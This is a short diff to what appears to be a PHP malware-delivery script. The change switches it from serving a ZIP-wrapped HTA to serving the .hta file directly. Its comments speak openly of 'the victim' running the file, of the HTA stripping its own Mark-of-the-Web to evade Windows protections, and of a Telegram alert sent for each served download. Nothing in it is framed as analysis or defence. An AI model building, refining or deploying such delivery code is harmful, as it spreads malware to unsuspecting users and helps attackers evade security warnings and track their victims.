@@ -23,9 +23,8 @@ $name = (string)($_GET['n'] ?? '');
 if ($name === '' || preg_match('/[^A-Za-z0-9_. -]/', $name)) { $name = make_name(); }
 $name = substr($name, 0, 90);
 if (!str_ends_with($name, '.hta')) { $name .= '.hta'; }
-// Served file is a .zip; entry inside keeps the .hta name (that's what
-// the victim runs after extracting).
-$zipName = str_replace('.hta', '.zip', $name);
+// Served file IS the .hta (direct-download variant).
+$zipName = $name;
 
 // ---- read source HTA (byte-identical on every download; the HTA strips
 //      its own Mark-of-the-Web at runtime, so no per-copy mutation is
@@ -43,10 +42,7 @@ if ($levelKey !== '') {
     }
 }
 
-// ---- wrap the HTA in a DETERMINISTIC .zip (in-memory): fixed entry name,
-//      fixed DOS timestamp, no extra fields -> same outer SHA-256 always. ----
-$innerName = basename($src);
-$bytes = build_zip($innerName, $bytes);
+// ---- direct-download variant: serve the .hta bytes as-is ----
 
 // ---- one Telegram alert per real served download (deduped by visit) ----
 $key = ALERT_DIR . '/dl_' . md5($tok['r'] . '|' . $name) . '.fired';
